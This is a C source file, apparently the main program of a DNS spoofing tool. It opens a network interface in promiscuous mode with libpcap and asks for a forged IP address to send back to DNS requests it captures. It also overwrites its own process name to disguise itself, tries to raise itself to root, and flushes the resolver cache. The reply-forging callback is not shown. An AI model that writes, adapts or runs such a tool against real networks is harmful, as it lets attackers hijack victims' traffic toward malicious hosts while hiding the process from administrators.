#include "spoof.h"

pid_t pid;

int main(int argc, char *argv[]) {
    struct options_spoofing opts;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    struct bpf_program fp;      // holds compiled program
    bpf_u_int32 maskp;          // subnet mask
    bpf_u_int32 netp;           // ip
    char* nic_device;
    u_char* args = NULL;
    pcap_t* nic_fd;



    check_root_user();
    options_spoofing_init(&opts);
    get_ip_address(&opts);   // Returning IP address

    program_setup(argc, argv);              // set process name, get root privilege
    nic_device = pcap_lookupdev(errbuf);    // get interface

    // get the IP address and subnet mask of the device
    pcap_lookupnet(nic_device, &netp, &maskp, errbuf);

    // open the device for packet capture & set the device in promiscuous mode
    nic_fd = pcap_open_live(nic_device, BUFSIZ, 1, -1, errbuf);
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    printf("[ DNS spoofing: %s ]\n", opts.spoof_ip);
    puts("- Program Initiated -");
    signal(SIGINT,sig_handler);
    pcap_loop(nic_fd, (int) opts.count, pkt_callback, args);

    return 0;
}


void options_spoofing_init(struct options_spoofing *opts) {
    memset(opts, 0, sizeof(struct options_spoofing));
}


void program_setup(int argc, char *argv[]) {
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);

    /* Flush caches that has website already visited */
    system("Systemd-resolve --flush-caches");

    /* change the UID/GID to 0 (raise privilege) */
    setuid(0);
    setgid(0);
}


void get_ip_address(struct options_spoofing *opts) {
    uint8_t input_length;

    while (1) {
        puts("\n[ Returning IP ]");
        printf("Enter response [ IP ] when get DNS request: ");
        fflush(stdout);
        fgets(opts->spoof_ip, sizeof(opts->spoof_ip), stdin);
        input_length = (uint8_t) strlen(opts->spoof_ip);
        if (input_length > 0 && opts->spoof_ip[input_length - 1] == '\n') {
            opts->spoof_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->spoof_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void sig_handler(int signum) {
    //Return type of the handler function should be void
    pid = getpid();
    printf("Ctrl + C pressed\n Exit program \n");
    kill(pid,SIGUSR1);
}

